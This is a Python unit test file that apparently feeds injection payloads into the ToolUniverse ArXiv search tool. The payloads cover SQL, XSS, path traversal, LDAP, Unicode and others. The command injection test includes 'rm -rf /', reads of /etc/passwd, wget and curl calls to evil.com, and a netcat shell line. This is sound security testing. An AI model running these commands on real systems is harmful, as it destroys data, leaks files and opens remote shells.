#!/usr/bin/env python3
"""
Test parameter validation edge cases and security vulnerabilities

This test file covers important parameter validation scenarios that were missing:
1. SQL injection attempts
2. XSS attempts
3. Path traversal attempts
4. Buffer overflow attempts
5. Parameter pollution
6. Type confusion attacks
7. Boundary value testing
"""

import sys
import unittest
from pathlib import Path
import pytest
from unittest.mock import patch, Mock, MagicMock

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from tooluniverse import ToolUniverse
from tooluniverse.exceptions import ToolError, ToolValidationError


@pytest.mark.unit
class TestParameterValidationSecurity(unittest.TestCase):
    """Test parameter validation security and edge cases."""
    
    def setUp(self):
        """Set up test fixtures."""
        self.tu = ToolUniverse()
        # Don't load tools to avoid embedding model loading issues
        self.tu.all_tools = []
        self.tu.all_tool_dict = {}
    
    def test_sql_injection_attempts(self):
        """Test protection against SQL injection attempts."""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' OR 1=1 --",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "' OR 1=1#",
            "') OR ('1'='1",
        ]
        
        for payload in sql_injection_payloads:
            result = self.tu.run({
                "name": "ArXiv_search_papers",
                "arguments": {"query": payload, "limit": 5}
            })
            
            self.assertIsInstance(result, dict)
            # Should not execute SQL injection
    
    def test_xss_attempts(self):
        """Test protection against XSS attempts."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
        ]
        
        for payload in xss_payloads:
            result = self.tu.run({
                "name": "ArXiv_search_papers",
                "arguments": {"query": payload, "limit": 5}
            })
            
            self.assertIsInstance(result, dict)
            # Should not execute XSS
    
    def test_path_traversal_attempts(self):
        """Test protection against path traversal attempts."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
            "..%255c..%255c..%255cetc%255cpasswd",
            "..%5c..%5c..%5cetc%5cpasswd",
            "..%2e%2e%2f..%2e%2e%2f..%2e%2e%2fetc%2fpasswd",
        ]
        
        for payload in path_traversal_payloads:
            result = self.tu.run({
                "name": "ArXiv_search_papers",
                "arguments": {"query": payload, "limit": 5}
            })
            
            self.assertIsInstance(result, dict)
            # Should not access files outside intended directory
    
    def test_command_injection_attempts(self):
        """Test protection against command injection attempts."""
        command_injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& whoami",
            "|| id",
            "; ls -la",
            "| wget http://evil.com/malware",
            "&& curl http://evil.com/steal",
            "; nc -l -p 4444 -e /bin/bash",
            "| python -c 'import os; os.system(\"rm -rf /\")'",
            "; echo 'hacked' > /tmp/hacked",
        ]
        
        for payload in command_injection_payloads:
            result = self.tu.run({
                "name": "ArXiv_search_papers",
                "arguments": {"query": payload, "limit": 5}
            })
            
            self.assertIsInstance(result, dict)
            # Should not execute system commands
    
    def test_buffer_overflow_attempts(self):
        """Test protection against buffer overflow attempts."""
        buffer_overflow_payloads = [
            "A" * 10000,  # Very long string
            "A" * 100000,  # Extremely long string
            "A" * 1000000,  # Massive string
            "\x00" * 1000,  # Null bytes
            "\xff" * 1000,  # High bytes
            "A" * 1000 + "\x00" * 1000,  # Mixed content
        ]
        
        for payload in buffer_overflow_payloads:
            result = self.tu.run({
                "name": "ArXiv_search_papers",
                "arguments": {"query": payload, "limit": 5}
            })
            
            self.assertIsInstance(result, dict)
            # Should handle large inputs gracefully
    
    def test_parameter_pollution(self):
        """Test protection against parameter pollution."""
        # Test duplicate parameters
        result = self.tu.run({
            "name": "ArXiv_search_papers",
            "arguments": {
                "query": "test",
                "limit": 5,
                "query": "malicious",  # Duplicate parameter
                "limit": 1000,  # Duplicate parameter
            }
        })
        
        self.assertIsInstance(result, dict)
        # Should handle duplicate parameters appropriately
    
    def test_type_confusion_attacks(self):
        """Test protection against type confusion attacks."""
        type_confusion_cases = [
            {"query": 123, "limit": "not_a_number"},  # Wrong types
            {"query": [], "limit": {}},  # Wrong types
            {"query": None, "limit": None},  # None values
            {"query": True, "limit": False},  # Boolean values
            {"query": {"nested": "object"}, "limit": ["array"]},  # Complex types
        ]
        
        for case in type_confusion_cases:
            result = self.tu.run({
                "name": "ArXiv_search_papers",
                "arguments": case
            })
            
            self.assertIsInstance(result, dict)
            # Should handle type confusion appropriately
    
    def test_boundary_value_testing(self):
        """Test boundary value testing for parameters."""
        boundary_cases = [
            {"query": "", "limit": 0},  # Empty string, zero limit
            {"query": "a", "limit": 1},  # Minimum values
            {"query": "test", "limit": -1},  # Negative limit
            {"query": "test", "limit": 0},  # Zero limit
            {"query": "test", "limit": 1},  # Minimum positive limit
            {"query": "test", "limit": 1000},  # Large limit
            {"query": "test", "limit": 10000},  # Very large limit
            {"query": "test", "limit": 999999},  # Extremely large limit
        ]
        
        for case in boundary_cases:
            result = self.tu.run({
                "name": "ArXiv_search_papers",
                "arguments": case
            })
            
            self.assertIsInstance(result, dict)
            # Should handle boundary values appropriately
    
    def test_unicode_attack_vectors(self):
        """Test protection against Unicode-based attack vectors."""
        unicode_attack_vectors = [
            "test\u0000hidden",  # Null byte injection
            "test\u200bhidden",  # Zero-width space
            "test\u200chidden",  # Zero-width non-joiner
            "test\u200dhidden",  # Zero-width joiner
            "test\u200ehidden",  # Zero-width non-breaking space
            "test\u200fhidden",  # Right-to-left mark
            "test\u202ahidden",  # Left-to-right embedding
            "test\u202bhidden",  # Right-to-left embedding
            "test\u202chidden",  # Pop directional formatting
            "test\u202dhidden",  # Left-to-right override
            "test\u202ehidden",  # Right-to-left override
            "test\u202fhidden",  # Narrow no-break space
            "test\u2060hidden",  # Word joiner
            "test\u2061hidden",  # Function application
            "test\u2062hidden",  # Invisible times
            "test\u2063hidden",  # Invisible separator
            "test\u2064hidden",  # Invisible plus
        ]
        
        for vector in unicode_attack_vectors:
            result = self.tu.run({
                "name": "ArXiv_search_papers",
                "arguments": {"query": vector, "limit": 5}
            })
            
            self.assertIsInstance(result, dict)
            # Should handle Unicode attack vectors appropriately
    
    def test_regex_injection_attempts(self):
        """Test protection against regex injection attempts."""
        regex_injection_payloads = [
            ".*",  # Match everything
            "^.*$",  # Match everything
            "test.*",  # Match everything after test
            ".*test",  # Match everything before test
            "test.*test",  # Match everything between tests
            "test|admin",  # OR condition
            "test|.*",  # OR with match everything
            "test+",  # One or more
            "test*",  # Zero or more
            "test?",  # Zero or one
            "test{1,}",  # One or more
            "test{0,}",  # Zero or more
            "test{1,100}",  # Range
            "test(.*)",  # Group
            "test[abc]",  # Character class
            "test[^abc]",  # Negated character class
            "test[a-z]",  # Range character class
            "test\\d",  # Digit
            "test\\w",  # Word character
            "test\\s",  # Whitespace
            "test\\b",  # Word boundary
            "test\\A",  # Start of string
            "test\\Z",  # End of string
        ]
        
        for payload in regex_injection_payloads:
            result = self.tu.run({
                "name": "ArXiv_search_papers",
                "arguments": {"query": payload, "limit": 5}
            })
            
            self.assertIsInstance(result, dict)
            # Should handle regex injection appropriately
    
    def test_json_injection_attempts(self):
        """Test protection against JSON injection attempts."""
        json_injection_payloads = [
            '{"malicious": "payload"}',
            '{"query": "test", "malicious": "payload"}',
            '{"query": "test", "limit": 5, "malicious": "payload"}',
            '{"query": "test", "limit": 5, "extra": {"nested": "malicious"}}',
            '{"query": "test", "limit": 5, "array": ["malicious", "payload"]}',
            '{"query": "test", "limit": 5, "boolean": true, "malicious": "payload"}',
            '{"query": "test", "limit": 5, "null": null, "malicious": "payload"}',
            '{"query": "test", "limit": 5, "number": 123, "malicious": "payload"}',
        ]
        
        for payload in json_injection_payloads:
            result = self.tu.run({
                "name": "ArXiv_search_papers",
                "arguments": {"query": payload, "limit": 5}
            })
            
            self.assertIsInstance(result, dict)
            # Should handle JSON injection appropriately
    
    def test_xml_injection_attempts(self):
        """Test protection against XML injection attempts."""
        xml_injection_payloads = [
            "<malicious>payload</malicious>",
            "<query>test</query><malicious>payload</malicious>",
            "<query>test</query><limit>5</limit><malicious>payload</malicious>",
            "<query>test</query><limit>5</limit><extra><nested>malicious</nested></extra>",
            "<query>test</query><limit>5</limit><array><item>malicious</item><item>payload</item></array>",
            "<query>test</query><limit>5</limit><boolean>true</boolean><malicious>payload</malicious>",
            "<query>test</query><limit>5</limit><null></null><malicious>payload</malicious>",
            "<query>test</query><limit>5</limit><number>123</number><malicious>payload</malicious>",
        ]
        
        for payload in xml_injection_payloads:
            result = self.tu.run({
                "name": "ArXiv_search_papers",
                "arguments": {"query": payload, "limit": 5}
            })
            
            self.assertIsInstance(result, dict)
            # Should handle XML injection appropriately
    
    def test_ldap_injection_attempts(self):
        """Test protection against LDAP injection attempts."""
        ldap_injection_payloads = [
            "*",
            "*)(&",
            "*)(|",
            "*)(!",
            "*)(&(objectClass=*",
            "*)(|(objectClass=*",
            "*)(!(objectClass=*",
            "*)(&(cn=*",
            "*)(|(cn=*",
            "*)(!(cn=*",
        ]
        
        for payload in ldap_injection_payloads:
            result = self.tu.run({
                "name": "ArXiv_search_papers",
                "arguments": {"query": payload, "limit": 5}
            })
            
            self.assertIsInstance(result, dict)
            # Should handle LDAP injection appropriately
    
    def test_noop_attack_attempts(self):
        """Test protection against noop attack attempts."""
        noop_attack_payloads = [
            "test;",  # Semicolon
            "test#",  # Hash
            "test--",  # Double dash
            "test/*",  # Comment start
            "test*/",  # Comment end
            "test/*comment*/",  # Comment
            "test;--",  # Semicolon and comment
            "test;#",  # Semicolon and hash
            "test;/*comment*/",  # Semicolon and comment
            "test#--",  # Hash and comment
        ]
        
        for payload in noop_attack_payloads:
            result = self.tu.run({
                "name": "ArXiv_search_papers",
                "arguments": {"query": payload, "limit": 5}
            })
            
            self.assertIsInstance(result, dict)
            # Should handle noop attacks appropriately


if __name__ == "__main__":
    unittest.main()
